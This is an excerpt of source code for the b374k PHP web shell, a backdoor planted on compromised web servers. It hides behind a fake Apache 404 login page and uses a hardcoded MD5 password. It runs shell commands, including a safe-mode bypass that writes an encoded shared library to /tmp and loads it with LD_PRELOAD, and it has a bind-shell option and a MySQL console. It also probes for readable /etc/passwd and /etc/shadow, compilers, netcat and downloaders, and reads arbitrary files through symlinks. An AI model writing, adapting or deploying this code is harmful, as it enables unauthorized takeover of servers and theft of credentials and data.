...
$s_ver = "2.2 ~ Modified"; // shell ver
$s_title = $s_name." ".$s_ver; // shell title
$s_pass = "8f04c2db7a34bcddecc63f8b902410a2"; 
$s_404 = true; // use 404 login

$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
  if(isset($_COOKIE['b374k'])){
    if(trim($s_pass) == trim($_COOKIE['b374k'])) $s_auth = true;
  }
  if(isset($_REQUEST['login'])){
    $login = trim($_REQUEST['login']);
    if(trim($s_pass) == md5($login)){
...
$safe_so = "";
...
function ss($t){
  if (!get_magic_quotes_gpc()) return trim($t);
  return trim(stripslashes($t));
}
// only strip slashes
function ssc($t){
...
function rs($s_win, $d, $type, $sc, $target){
  ...
  if($type == "xbind_pl"){
    $fname = "b374k_bind.pl";
    $fpath = (file_exists('/tmp/') ? "/tmp/{$fname}" : $d.$fname);
...
// shell command
function exe($c){
  global $s_win,$s_safemode,$safe_so;
  ...
  elseif(function_exists('proc_open') && !$s_win && $s_safemode && version_compare(PHP_VERSION, '5.3.0', '<=')) {
    $f=fopen('/tmp/a.so','w');
    fputs($f,gzinflate(base64_decode($safe_so)));
    fclose($f);
    $f=fopen('/tmp/.comm','w');
    fputs($f,$c);
    fclose($f);
    $ds=array(0=>array('pipe','r'),1=>array('file','/tmp/output.txt','w'),2=>array('file','/tmp/errors.txt','a'));
    $env=array('LD_PRELOAD'=>'/tmp/a.so');
    $cwd='.';
    proc_open('id > /tmp/a',$ds,$pipes,$cwd,$env);
    sleep(1);
    $f=fopen('/tmp/.comm1','r');
    $b='';
    if(file_exists('/tmp/.comm1')) while (!feof($f)){$b.=fgets($f);}
    fclose($f);
    unlink('/tmp/.comm');
    unlink('/tmp/.comm1');
    unlink('/tmp/a.so');
...
if($s_auth){
  ...
  elseif(isset($_REQUEST['db'])){
    ...
    if(isset($_REQUEST['mysqlcon']) && ($con = mysql_connect($hostandport,$sqluser,$sqlpass))){
      if (isset($_REQUEST['setdb'])) setcookie("b374k_db",$_REQUEST['setdb'],time() + 3600*24*7);
      if (!empty($_COOKIE['b374k_db'])) mysql_select_db($_COOKIE['b374k_db']);
      if(isset($_REQUEST['sqlcode'])){
        ...
        foreach($querys as $query){
          ...
          if($hasil){
          	if (isset($_REQUEST['setdb'])) $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\"><span class=\"gaya\">[</span> Selected database " . htmlspecialchars($_REQUEST['setdb']) . " <span class=\"gaya\">]</span></p>";
            elseif (!empty($_COOKIE['b374k_db'])) $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\"><span class=\"gaya\">[</span> Using database " . htmlspecialchars($_COOKIE['b374k_db']) . " <span class=\"gaya\">]</span></p>";
            if(preg_match('/use\s+(.*)/i',$query,$matches)) setcookie("b374k_db",$matches[1],time() + 3600*24*7);
            ...
            while($rows=mysql_fetch_array($hasil)){
              ...
              for($j=0;$j<mysql_num_fields($hasil);$j++)
              {
                ...
                if(preg_match('/show\s+databases/i',$query)) $dataz = '<form action="' . $_SERVER['PHP_SELF'] . '?db" method="post"><input type="hidden" name="setdb" value="' . $dataz . '" /><input type="hidden" name="mysqlcon" value="Go !" /><input type="hidden" name="sqlhost" value="'.$sqlhost.'" /><input type="hidden" name="sqluser" value="'.$sqluser.'" /><input type="hidden" name="sqlport" value="'.$sqlport.'" /><input type="hidden" name="sqlpass" value="'.$sqlpass.'" /><input type="hidden" name="d" value="'.$pwd.'" /><a href="#" onclick="this.parentNode.submit();">' . $dataz . '</a></form>';
                else $dataz = htmlspecialchars($dataz);
                $q_result .= "<td>{$dataz}</td>";
              }
              $q_result .= "</tr>";
            }
            $q_result .= "</table>";
  ...
  elseif(isset($_REQUEST['info'])){
    $disabled = (ini_get('disable_functions') ? ini_get('disable_functions') : 'none');
    $curl = (function_exists('curl_init') ? 'yes' : 'no');
    $passwd = (is_readable('/etc/passwd') ? 'yes <a href="?d=/etc/&view=/etc/passwd">[view]</a>' : 'no');
    $shadow = (is_readable('/etc/shadow') ? 'yes <a href="?d=/etc/&view=/etc/shadow">[view]</a>' : 'no');
    $distro = file_get_contents('/etc/issue.net');
    $toolsArray = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
    $downloadersArray = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
    $tools = array();
    $downloaders = array();
    
    foreach ($toolsArray as $tool) if (exe("which {$tool}") != '') $tools[] = $tool;
    foreach ($downloadersArray as $downloader) if (exe("which {$downloader}") != '') $downloaders[] = $downloader;
    
    $tools = implode(', ', $tools);
    $downloaders = implode(', ', $downloaders);
    
    $databases = array();
	if (function_exists('mysql_connect')) $databases[] = 'MySQL (' . mysql_get_client_info() . ')';
	if (function_exists('mssql_connect')) $databases[] = 'MsSQL';
	if (function_exists('pg_connect')) $databases[] = 'PostgreSQL';
	if (function_exists('oci_connect')) $databases[] = 'Oracle';
	$databases = implode(', ', $databases);
	
    $s_result .= "Disabled PHP functions: {$disabled}<br>
    cURL Support: {$curl}<br>
    Supported databases: {$databases}<br>
    <br>
    Readable /etc/passwd: {$passwd}<br>
    Readable /etc/shadow: {$shadow}<br>
    Distribution name: {$distro}<br>
    <br>
    Useful tools: {$tools}<br>
    Downloaders: {$downloaders}";
  }
  elseif(isset($_REQUEST['symlink'])){
    if ($_POST['file']){
      @unlink('/tmp/symlink');
      symlink($_POST['file'],'/tmp/symlink');
      $s_result .= "<div class=\"viewfilecontent\">";
      $s_result .=  nl2br(htmlentities(wordwrap(file_get_contents('/tmp/symlink'),160,"\n",true)));
      $s_result .=   "</div>";
    } else {
      $s_result .= '
      <form action="' . $_SERVER['PHP_SELF'] . '?symlink&d=' . $pwd . '" method="post">
      
        File to view:<span style="padding: 0 10px 0 10px;"></span><input type="text" onclick="clicksymlink();" id="symlink" class="inputz" style="width: 300px;" name="file" value="- path to file -" />
...
<address>Apache Server at <?php echo $_SERVER['HTTP_HOST']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
	...
	<center>
		<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
			...
			<input type="hidden" name="submitlogin" value="Go !" />
		</form>
	</center>
...
function clicksymlink(){
  var buff = document.getElementById('symlink');
  if(buff.value == '- path to file -') buff.value = '';
}
</script>
...
<table id="main"><tr><td><?php if($s_auth){ ?>
  ...
  <div id="menu">
    ...
    <td><a href="?info&d=<?php echo $pwd; ?>" title="Security Information"><div class="menumi">info</div></a></td>
    <td><a href="?symlink&d=<?php echo $pwd; ?>" title="Symlink a File"><div class="menumi">symlink</div></a></td>
